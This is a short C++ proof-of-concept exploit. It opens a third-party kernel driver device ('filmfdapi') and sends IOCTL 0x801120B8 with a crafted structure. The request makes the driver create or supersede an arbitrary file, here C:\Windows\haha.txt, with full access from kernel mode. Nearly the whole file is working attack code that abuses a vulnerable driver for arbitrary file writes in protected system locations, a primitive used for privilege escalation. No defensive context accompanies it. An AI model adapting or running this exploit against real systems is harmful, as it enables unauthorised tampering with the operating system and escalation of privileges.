﻿#include <iostream>
#include <Windows.h>
#include <winioctl.h>

#define SymLinkName L"\\\\.\\filmfdapi"

HANDLE hDevice;

struct DATA_0x801120B8_ZwCreateFile
{
    unsigned long long choose;    // offset 0
    unsigned char padding1[8];
    WCHAR filePath[0x200] = {0};    // offset 0x10
    ACCESS_MASK DesiredAccess;      // offset 0x410
    ULONG ShareAccess;              // offset 0x414
    unsigned char padding2[4];
    ULONG CreateDisposition;    // offset 0x41C
    ULONG CreateOptions;        // offset 0x420
};

void CreateFile_0x801120B8()
{
    DWORD dwWrite;
    DATA_0x801120B8_ZwCreateFile data;
    data.choose = 0;
    wcscpy_s(data.filePath, L"\\??\\C:\\Windows\\haha.txt\0");
    data.DesiredAccess = GENERIC_ALL;
    data.ShareAccess = 0;
    data.CreateDisposition = 0;         // FILE_SUPERSEDE
    data.CreateOptions = 0x00000040;    // FILE_NON_DIRECTORY_FILE
    DeviceIoControl(hDevice, 0x801120B8, &data, sizeof(data), &data, sizeof(data), &dwWrite, NULL);
}


int main(int argc, char* argv[])
{
    hDevice = CreateFile(SymLinkName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, 0);
    if (hDevice == INVALID_HANDLE_VALUE)
    {
        printf("Get Driver Handle Error with Win32 error code: %llx\n", GetLastError());
        system("pause");
        return 0;
    }

    CreateFile_0x801120B8();

    system("pause");
    return 0;
}
